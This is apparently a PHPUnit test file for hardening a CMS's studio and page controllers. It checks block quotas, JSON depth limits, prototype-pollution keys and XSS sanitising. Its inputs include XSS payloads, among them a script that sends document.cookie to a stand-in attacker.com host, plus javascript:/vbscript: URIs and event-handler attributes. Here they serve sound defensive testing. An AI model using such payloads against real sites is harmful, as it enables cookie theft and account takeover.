<?php

declare(strict_types=1);

namespace App\Tests\Controller;

use App\Controller\PageController;
use App\Controller\StudioController;
use App\Entity\Collection;
use App\Entity\EndUser;
use App\Entity\Field;
use App\Entity\Project;
use App\Entity\ProjectMember;
use App\Entity\Role;
use App\Entity\User;
use App\Repository\AppSettingsRepository;
use App\Repository\CollectionRepository;
use App\Repository\ContentEntryRepository;
use App\Repository\EndUserFieldRepository;
use App\Repository\EndUserRepository;
use App\Repository\FieldRepository;
use App\Repository\MediaRepository;
use App\Repository\ProjectMemberRepository;
use App\Repository\ProjectRepository;
use App\Repository\StudioChatMessageRepository;
use App\Service\AiContentService;
use App\Service\EavDataFormatterService;
use App\Service\FieldRelationOptionsNormalizer;
use App\Service\FieldValueHydrator;
use App\Service\MediaSerializer;
use App\Service\Security\HtmlContentSanitizer;
use App\Service\Security\PageCompositionSecurityService;
use App\Service\Security\SsrfProtectionService;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\TestCase;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Uid\Uuid;
use Symfony\Contracts\HttpClient\HttpClientInterface;
use Symfony\Contracts\Translation\TranslatorInterface;

/**
 * Tests unitaires et d'intégration Cycle 88 :
 * Durcissement StudioController et PageController
 * - Contrôle des quotas de blocs visuels (collections, champs, sous-champs, total)
 * - Contrôle de la profondeur de composition JSON de page
 * - Assainissement XSS/DOM des attributs et injection de scripts personnalisés
 * - Intégration EndUserCustomFieldsSanitizer dans PageController
 */
class Cycle88StudioAndPageHardeningTest extends TestCase
{
    private function createTranslator(): TranslatorInterface
    {
        $translator = $this->createMock(TranslatorInterface::class);
        $translator->method('trans')->willReturnCallback(
            fn (string $id, array $params = []) => strtr($id, $params)
        );
        return $translator;
    }

    // ════════════════════ 1. PageCompositionSecurityService - Quotas de Blocs ════════════════════

    public function testBlockQuotasRejectsExceedingMaxCollections(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $collections = [];
        for ($i = 1; $i <= PageCompositionSecurityService::MAX_COLLECTIONS_PER_SCHEMA + 1; $i++) {
            $collections[] = ['name' => "Col{$i}", 'slug' => "col_{$i}", 'fields' => []];
        }

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.quota.max_collections_exceeded');
        $service->validateBlockQuotas($collections);
    }

    public function testBlockQuotasRejectsExceedingMaxFieldsPerCollection(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $fields = [];
        for ($i = 1; $i <= PageCompositionSecurityService::MAX_FIELDS_PER_COLLECTION + 1; $i++) {
            $fields[] = ['name' => "Field{$i}", 'slug' => "field_{$i}", 'type' => 'text'];
        }

        $collections = [
            ['name' => 'Col1', 'slug' => 'col_1', 'fields' => $fields],
        ];

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.quota.max_fields_exceeded');
        $service->validateBlockQuotas($collections);
    }

    public function testBlockQuotasRejectsExceedingMaxSubfieldsPerBlock(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $subfields = [];
        for ($i = 1; $i <= PageCompositionSecurityService::MAX_SUBFIELDS_PER_BLOCK + 1; $i++) {
            $subfields[] = ['name' => "Sub{$i}", 'slug' => "sub_{$i}"];
        }

        $collections = [
            [
                'name' => 'Col1',
                'slug' => 'col_1',
                'fields' => [
                    [
                        'name' => 'Repeater',
                        'slug' => 'repeater',
                        'type' => 'repeater',
                        'options' => ['subfields' => $subfields],
                    ],
                ],
            ],
        ];

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.quota.max_subfields_exceeded');
        $service->validateBlockQuotas($collections);
    }

    public function testBlockQuotasRejectsExceedingTotalVisualBlocks(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        // 10 collections avec 60 champs chacune = 600 champs + 10 collections = 610 blocs > 500
        $collections = [];
        for ($c = 1; $c <= 10; $c++) {
            $fields = [];
            for ($f = 1; $f <= 60; $f++) {
                $fields[] = ['name' => "F{$c}_{$f}", 'slug' => "f_{$c}_{$f}", 'type' => 'text'];
            }
            $collections[] = ['name' => "Col{$c}", 'slug' => "col_{$c}", 'fields' => $fields];
        }

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.quota.max_total_blocks_exceeded');
        $service->validateBlockQuotas($collections);
    }

    public function testBatchEntriesQuotaRejectsExceedingMaxEntries(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $entries = array_fill(0, PageCompositionSecurityService::MAX_BATCH_ENTRIES + 1, ['title' => 'Test']);

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.quota.max_batch_entries_exceeded');
        $service->validateBatchEntriesQuota($entries);
    }

    // ════════════════════ 2. PageCompositionSecurityService - Profondeur JSON ════════════════════

    public function testAssertJsonDepthPassesUnderLimit(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $data = ['level1' => ['level2' => ['level3' => ['value' => 'ok']]]];
        $service->assertJsonDepth($data, 5);
        $this->assertTrue(true);
    }

    public function testAssertJsonDepthRejectsDeeplyNestedStructure(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        // Construire 12 niveaux d'imbrication
        $data = 'deep';
        for ($i = 12; $i >= 1; $i--) {
            $data = ["level_{$i}" => $data];
        }

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.composition.max_depth_exceeded');
        $service->assertJsonDepth($data, 10);
    }

    public function testAssertJsonDepthRejectsPrototypePollutionKeys(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $payload = [
            'layout' => [
                '__proto__' => ['polluted' => true],
            ],
        ];

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.composition.forbidden_key');
        $service->assertJsonDepth($payload);
    }

    // ════════════════════ 3. Assainissement XSS/DOM des Attributs & Scripts ════════════════════

    public function testSanitizeDomAttributesStripsEventHandlers(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $attrs = [
            'class' => 'btn primary',
            'onclick' => 'alert(1)',
            'ONLOAD' => 'evil()',
            'onerror' => 'hack()',
            'data-testid' => 'test-btn',
        ];

        $clean = $service->sanitizeDomAttributes($attrs);

        $this->assertSame('btn primary', $clean['class']);
        $this->assertSame('test-btn', $clean['data-testid']);
        $this->assertArrayNotHasKey('onclick', $clean);
        $this->assertArrayNotHasKey('ONLOAD', $clean);
        $this->assertArrayNotHasKey('onerror', $clean);
    }

    public function testSanitizeDomAttributesNeutralizesDangerousProtocols(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $attrs = [
            'href' => 'javascript:alert(document.cookie)',
            'src' => 'vbscript:msgbox(1)',
            'data' => 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'safe_link' => 'https://example.com',
        ];

        $clean = $service->sanitizeDomAttributes($attrs);

        $this->assertSame('#', $clean['href']);
        $this->assertSame('#', $clean['src']);
        $this->assertSame('#', $clean['data']);
        $this->assertSame('https://example.com', $clean['safe_link']);
    }

    public function testSanitizeDomAttributesCleansMaliciousStyles(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $attrs = [
            'style' => 'color: red; background: url("javascript:alert(1)");',
            'safe_style' => 'margin: 10px;',
        ];

        $clean = $service->sanitizeDomAttributes($attrs);
        $this->assertSame('', $clean['style']);
        $this->assertSame('margin: 10px;', $clean['safe_style']);
    }

    public function testSanitizeCollectionSettingsBlocksScriptInjection(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $settings = [
            'theme' => 'dark',
            'scripts' => '<script>window.location="http://attacker.com/?c="+document.cookie</script>',
        ];

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.security.script_injection_detected');
        $service->sanitizeCollectionSettings($settings);
    }

    public function testSanitizeCollectionSettingsAllowsSafeJsonLd(): void
    {
        $htmlSanitizer = new HtmlContentSanitizer();
        $service = new PageCompositionSecurityService($htmlSanitizer, null, $this->createTranslator());

        $settings = [
            'theme' => 'dark',
            'scripts' => '<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"Jambo"}</script>',
        ];

        $clean = $service->sanitizeCollectionSettings($settings);
        $this->assertIsArray($clean);
        $this->assertSame('dark', $clean['theme']);
    }

    public function testSanitizeCollectionSettingsRejectsInsecureHttpExternalScript(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $settings = [
            'custom_scripts' => [
                ['src' => 'http://insecure-cdn.com/tracker.js'],
            ],
        ];

        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('studio.security.script_injection_detected');
        $service->sanitizeCollectionSettings($settings);
    }

    public function testSanitizeTextStripsHtmlAndControlChars(): void
    {
        $service = new PageCompositionSecurityService(null, null, $this->createTranslator());

        $input = "<b>Hello</b>\x00<script>alert(1)</script> World";
        $clean = $service->sanitizeText($input);

        $this->assertSame('Hello World', $clean);
    }

    // ════════════════════ 4. StudioController - Validation applySchema ════════════════════

    public function testStudioApplySchemaRejectsExcessiveCollections(): void
    {
        $em = $this->createMock(EntityManagerInterface::class);
        $projectRepo = $this->createMock(ProjectRepository::class);
        $project = new Project();
        $project->uuid = Uuid::v4();
        $em->method('getRepository')->willReturn($projectRepo);
        $projectRepo->method('findOneBy')->willReturn($project);

        $translator = $this->createTranslator();
        $security = new PageCompositionSecurityService(new HtmlContentSanitizer(), new SsrfProtectionService(), $translator);

        $controller = new StudioController(
            em: $em,
            projectRepository: $projectRepo,
            appSettingsRepository: $this->createMock(AppSettingsRepository::class),
            httpClient: $this->createMock(HttpClientInterface::class),
            chatMessageRepository: $this->createMock(StudioChatMessageRepository::class),
            endUserRepository: $this->createMock(EndUserRepository::class),
            passwordHasher: $this->createMock(UserPasswordHasherInterface::class),
            mediaRepository: $this->createMock(MediaRepository::class),
            aiService: $this->createMock(AiContentService::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
            fieldValueHydrator: $this->createMock(FieldValueHydrator::class),
            translator: $translator,
            compositionSecurity: $security,
        );

        // Mock container security
        $container = $this->createMock(\Psr\Container\ContainerInterface::class);
        $securityChecker = $this->createMock(\Symfony\Component\Security\Core\Authorization\AuthorizationCheckerInterface::class);
        $securityChecker->method('isGranted')->willReturn(true);
        $container->method('has')->willReturn(true);
        $container->method('get')->willReturn($securityChecker);
        $controller->setContainer($container);

        $collections = [];
        for ($i = 1; $i <= 55; $i++) {
            $collections[] = ['name' => "Col{$i}", 'slug' => "col_{$i}", 'fields' => []];
        }

        $request = new Request([], [], [], [], [], [], json_encode(['collections' => $collections]));
        $response = $controller->applySchema($project->uuid->toRfc4122(), $request);

        $this->assertSame(422, $response->getStatusCode());
        $data = json_decode((string) $response->getContent(), true);
        $this->assertStringContainsString('studio.quota.max_collections_exceeded', $data['error']);
    }

    public function testStudioApplySchemaRejectsDeeplyNestedComposition(): void
    {
        $em = $this->createMock(EntityManagerInterface::class);
        $projectRepo = $this->createMock(ProjectRepository::class);
        $project = new Project();
        $project->uuid = Uuid::v4();
        $em->method('getRepository')->willReturn($projectRepo);
        $projectRepo->method('findOneBy')->willReturn($project);

        $translator = $this->createTranslator();
        $security = new PageCompositionSecurityService(new HtmlContentSanitizer(), new SsrfProtectionService(), $translator);

        $controller = new StudioController(
            em: $em,
            projectRepository: $projectRepo,
            appSettingsRepository: $this->createMock(AppSettingsRepository::class),
            httpClient: $this->createMock(HttpClientInterface::class),
            chatMessageRepository: $this->createMock(StudioChatMessageRepository::class),
            endUserRepository: $this->createMock(EndUserRepository::class),
            passwordHasher: $this->createMock(UserPasswordHasherInterface::class),
            mediaRepository: $this->createMock(MediaRepository::class),
            aiService: $this->createMock(AiContentService::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
            fieldValueHydrator: $this->createMock(FieldValueHydrator::class),
            translator: $translator,
            compositionSecurity: $security,
        );

        $container = $this->createMock(\Psr\Container\ContainerInterface::class);
        $securityChecker = $this->createMock(\Symfony\Component\Security\Core\Authorization\AuthorizationCheckerInterface::class);
        $securityChecker->method('isGranted')->willReturn(true);
        $container->method('has')->willReturn(true);
        $container->method('get')->willReturn($securityChecker);
        $controller->setContainer($container);

        // 15 niveaux dans options
        $nested = 'deep';
        for ($i = 15; $i >= 1; $i--) {
            $nested = ["n{$i}" => $nested];
        }

        $collections = [
            [
                'name' => 'DeepCol',
                'slug' => 'deep_col',
                'fields' => [
                    ['name' => 'F1', 'slug' => 'f1', 'type' => 'text', 'options' => $nested],
                ],
            ],
        ];

        $request = new Request([], [], [], [], [], [], json_encode(['collections' => $collections]));
        $response = $controller->applySchema($project->uuid->toRfc4122(), $request);

        $this->assertSame(422, $response->getStatusCode());
        $data = json_decode((string) $response->getContent(), true);
        $this->assertStringContainsString('studio.composition.max_depth_exceeded', $data['error']);
    }

    public function testStudioApplyEntriesRejectsDeeplyNestedJsonPayload(): void
    {
        $em = $this->createMock(EntityManagerInterface::class);
        $projectRepo = $this->createMock(ProjectRepository::class);
        $project = new Project();
        $project->uuid = Uuid::v4();
        $em->method('getRepository')->willReturn($projectRepo);
        $projectRepo->method('findOneBy')->willReturn($project);

        $translator = $this->createTranslator();
        $security = new PageCompositionSecurityService(new HtmlContentSanitizer(), new SsrfProtectionService(), $translator);

        $controller = new StudioController(
            em: $em,
            projectRepository: $projectRepo,
            appSettingsRepository: $this->createMock(AppSettingsRepository::class),
            httpClient: $this->createMock(HttpClientInterface::class),
            chatMessageRepository: $this->createMock(StudioChatMessageRepository::class),
            endUserRepository: $this->createMock(EndUserRepository::class),
            passwordHasher: $this->createMock(UserPasswordHasherInterface::class),
            mediaRepository: $this->createMock(MediaRepository::class),
            aiService: $this->createMock(AiContentService::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
            fieldValueHydrator: $this->createMock(FieldValueHydrator::class),
            translator: $translator,
            compositionSecurity: $security,
        );

        $container = $this->createMock(\Psr\Container\ContainerInterface::class);
        $securityChecker = $this->createMock(\Symfony\Component\Security\Core\Authorization\AuthorizationCheckerInterface::class);
        $securityChecker->method('isGranted')->willReturn(true);
        $container->method('has')->willReturn(true);
        $container->method('get')->willReturn($securityChecker);
        $controller->setContainer($container);

        $nested = 'deep';
        for ($i = 15; $i >= 1; $i--) {
            $nested = ["n{$i}" => $nested];
        }

        $request = new Request([], [], [], [], [], [], json_encode([
            'collection' => 'articles',
            'entry' => ['title' => 'Article', 'metadata' => $nested],
        ]));

        $response = $controller->applyEntries($project->uuid->toRfc4122(), $request);
        $this->assertSame(422, $response->getStatusCode());
        $data = json_decode((string) $response->getContent(), true);
        $this->assertStringContainsString('studio.composition.max_depth_exceeded', $data['error']);
    }

    // ════════════════════ 5. PageController - EndUsers Hardening ════════════════════

    public function testPageControllerSettingsEndUsersStoreSanitizesUsernameAndCustomFields(): void
    {
        $project = new Project();
        $project->name = 'Test Project';

        $projectRepo = $this->createMock(ProjectRepository::class);
        $projectRepo->method('find')->willReturn($project);

        $endUserRepo = $this->createMock(EndUserRepository::class);
        $endUserRepo->method('findOneByProjectAndEmail')->willReturn(null);

        $em = $this->createMock(EntityManagerInterface::class);
        $persistedUser = null;
        $em->method('persist')->willReturnCallback(function ($entity) use (&$persistedUser) {
            if ($entity instanceof EndUser) {
                $persistedUser = $entity;
            }
        });

        $hasher = $this->createMock(UserPasswordHasherInterface::class);
        $hasher->method('hashPassword')->willReturn('hashed_pwd_123');

        $translator = $this->createTranslator();
        $security = new PageCompositionSecurityService(new HtmlContentSanitizer(), new SsrfProtectionService(), $translator);

        $controller = new PageController(
            projectRepository: $projectRepo,
            collectionRepository: $this->createMock(CollectionRepository::class),
            fieldRepository: $this->createMock(FieldRepository::class),
            entryRepository: $this->createMock(ContentEntryRepository::class),
            apiTokenRepository: $this->createMock(\App\Repository\ApiTokenRepository::class),
            endUserRepository: $endUserRepo,
            endUserFieldRepository: $this->createMock(EndUserFieldRepository::class),
            em: $em,
            formatter: $this->createMock(EavDataFormatterService::class),
            mediaSerializer: $this->createMock(MediaSerializer::class),
            memberRepo: $this->createMock(ProjectMemberRepository::class),
            hasher: $hasher,
            permissionRepository: $this->createMock(\App\Repository\PermissionRepository::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
            compositionSecurity: $security,
        );

        $currentUser = new User();
        $currentUser->roles = ['ROLE_SUPER_ADMIN'];

        $container = $this->createMock(\Psr\Container\ContainerInterface::class);
        $token = $this->createMock(\Symfony\Component\Security\Core\Authentication\Token\TokenInterface::class);
        $token->method('getUser')->willReturn($currentUser);
        $tokenStorage = $this->createMock(\Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorageInterface::class);
        $tokenStorage->method('getToken')->willReturn($token);
        $router = $this->createMock(\Symfony\Component\Routing\RouterInterface::class);
        $router->method('generate')->willReturn('/projects/1/settings/end-users');

        $container->method('has')->willReturnCallback(fn ($id) => in_array($id, ['security.token_storage', 'router'], true));
        $container->method('get')->willReturnCallback(fn ($id) => match ($id) {
            'security.token_storage' => $tokenStorage,
            'router' => $router,
            default => null,
        });
        $controller->setContainer($container);

        $request = new Request([], [], [], [], [], [], json_encode([
            'email' => 'clean@test.com',
            'password' => 'secret12345',
            'username' => '<script>alert(1)</script>John <b>Doe</b>',
            'custom_fields' => [
                'bio' => 'Senior Developer',
                'twitter' => '@johndoe',
            ],
        ]));

        $response = $controller->settingsEndUsersStore(1, $request);
        $this->assertSame(303, $response->getStatusCode());

        $this->assertNotNull($persistedUser);
        $this->assertSame('John Doe', $persistedUser->username, 'HTML tags and scripts must be stripped from username');
        $this->assertSame('Senior Developer', $persistedUser->customFields['bio'] ?? null);
    }

    public function testPageControllerSettingsEndUsersStoreRejectsDuplicateEmailWithTranslatedKey(): void
    {
        $project = new Project();
        $projectRepo = $this->createMock(ProjectRepository::class);
        $projectRepo->method('find')->willReturn($project);

        $existingUser = new EndUser($project, 'dup@test.com');
        $endUserRepo = $this->createMock(EndUserRepository::class);
        $endUserRepo->method('findOneByProjectAndEmail')->willReturn($existingUser);

        $translator = $this->createTranslator();
        $security = new PageCompositionSecurityService(null, null, $translator);

        $controller = new PageController(
            projectRepository: $projectRepo,
            collectionRepository: $this->createMock(CollectionRepository::class),
            fieldRepository: $this->createMock(FieldRepository::class),
            entryRepository: $this->createMock(ContentEntryRepository::class),
            apiTokenRepository: $this->createMock(\App\Repository\ApiTokenRepository::class),
            endUserRepository: $endUserRepo,
            endUserFieldRepository: $this->createMock(EndUserFieldRepository::class),
            em: $this->createMock(EntityManagerInterface::class),
            formatter: $this->createMock(EavDataFormatterService::class),
            mediaSerializer: $this->createMock(MediaSerializer::class),
            memberRepo: $this->createMock(ProjectMemberRepository::class),
            hasher: $this->createMock(UserPasswordHasherInterface::class),
            permissionRepository: $this->createMock(\App\Repository\PermissionRepository::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
            compositionSecurity: $security,
        );

        $currentUser = new User();
        $currentUser->roles = ['ROLE_SUPER_ADMIN'];

        $container = $this->createMock(\Psr\Container\ContainerInterface::class);
        $token = $this->createMock(\Symfony\Component\Security\Core\Authentication\Token\TokenInterface::class);
        $token->method('getUser')->willReturn($currentUser);
        $tokenStorage = $this->createMock(\Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorageInterface::class);
        $tokenStorage->method('getToken')->willReturn($token);
        $container->method('has')->willReturnCallback(fn ($id) => in_array($id, ['security.token_storage', 'router'], true));
        $container->method('get')->willReturnCallback(fn ($id) => match ($id) {
            'security.token_storage' => $tokenStorage,
            default => null,
        });
        $controller->setContainer($container);
        $controller->setTranslator($translator);

        $request = new Request([], [], [], [], [], [], json_encode([
            'email' => 'dup@test.com',
            'password' => 'secret12345',
        ]));

        $response = $controller->settingsEndUsersStore(1, $request);
        $this->assertSame(422, $response->getStatusCode());
        $data = json_decode((string) $response->getContent(), true);
        $this->assertSame('page.email_already_registered', $data['errors']['email']);
    }

    public function testPageControllerSettingsEndUsersStoreRejectsOversizedCustomFields(): void
    {
        $project = new Project();
        $projectRepo = $this->createMock(ProjectRepository::class);
        $projectRepo->method('find')->willReturn($project);

        $endUserRepo = $this->createMock(EndUserRepository::class);
        $endUserRepo->method('findOneByProjectAndEmail')->willReturn(null);

        $translator = $this->createTranslator();
        $security = new PageCompositionSecurityService(null, null, $translator);

        $controller = new PageController(
            projectRepository: $projectRepo,
            collectionRepository: $this->createMock(CollectionRepository::class),
            fieldRepository: $this->createMock(FieldRepository::class),
            entryRepository: $this->createMock(ContentEntryRepository::class),
            apiTokenRepository: $this->createMock(\App\Repository\ApiTokenRepository::class),
            endUserRepository: $endUserRepo,
            endUserFieldRepository: $this->createMock(EndUserFieldRepository::class),
            em: $this->createMock(EntityManagerInterface::class),
            formatter: $this->createMock(EavDataFormatterService::class),
            mediaSerializer: $this->createMock(MediaSerializer::class),
            memberRepo: $this->createMock(ProjectMemberRepository::class),
            hasher: $this->createMock(UserPasswordHasherInterface::class),
            permissionRepository: $this->createMock(\App\Repository\PermissionRepository::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
            compositionSecurity: $security,
        );

        $currentUser = new User();
        $currentUser->roles = ['ROLE_SUPER_ADMIN'];

        $container = $this->createMock(\Psr\Container\ContainerInterface::class);
        $token = $this->createMock(\Symfony\Component\Security\Core\Authentication\Token\TokenInterface::class);
        $token->method('getUser')->willReturn($currentUser);
        $tokenStorage = $this->createMock(\Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorageInterface::class);
        $tokenStorage->method('getToken')->willReturn($token);
        $container->method('has')->willReturnCallback(fn ($id) => in_array($id, ['security.token_storage', 'router'], true));
        $container->method('get')->willReturnCallback(fn ($id) => match ($id) {
            'security.token_storage' => $tokenStorage,
            default => null,
        });
        $controller->setContainer($container);
        $controller->setTranslator($translator);

        // 8 niveaux dans custom_fields (max depth = 5)
        $nested = 'val';
        for ($i = 8; $i >= 1; $i--) {
            $nested = ["level{$i}" => $nested];
        }

        $request = new Request([], [], [], [], [], [], json_encode([
            'email' => 'deep@test.com',
            'password' => 'secret12345',
            'custom_fields' => $nested,
        ]));

        $response = $controller->settingsEndUsersStore(1, $request);
        $this->assertSame(422, $response->getStatusCode());
        $data = json_decode((string) $response->getContent(), true);
        $this->assertArrayHasKey('custom_fields', $data['errors']);
    }

    public function testPageControllerResolveNotFoundThrowsTranslatedException(): void
    {
        $projectRepo = $this->createMock(ProjectRepository::class);
        $projectRepo->method('find')->willReturn(null);

        $translator = $this->createTranslator();
        $controller = new PageController(
            projectRepository: $projectRepo,
            collectionRepository: $this->createMock(CollectionRepository::class),
            fieldRepository: $this->createMock(FieldRepository::class),
            entryRepository: $this->createMock(ContentEntryRepository::class),
            apiTokenRepository: $this->createMock(\App\Repository\ApiTokenRepository::class),
            endUserRepository: $this->createMock(EndUserRepository::class),
            endUserFieldRepository: $this->createMock(EndUserFieldRepository::class),
            em: $this->createMock(EntityManagerInterface::class),
            formatter: $this->createMock(EavDataFormatterService::class),
            mediaSerializer: $this->createMock(MediaSerializer::class),
            memberRepo: $this->createMock(ProjectMemberRepository::class),
            hasher: $this->createMock(UserPasswordHasherInterface::class),
            permissionRepository: $this->createMock(\App\Repository\PermissionRepository::class),
            relationOptionsNormalizer: new FieldRelationOptionsNormalizer($this->createMock(CollectionRepository::class)),
        );
        $controller->setTranslator($translator);

        $method = new \ReflectionMethod($controller, 'resolveProjectAndCollection');

        $this->expectException(NotFoundHttpException::class);
        $this->expectExceptionMessage('page.project_not_found');
        $method->invoke($controller, 9999, 1);
    }
}
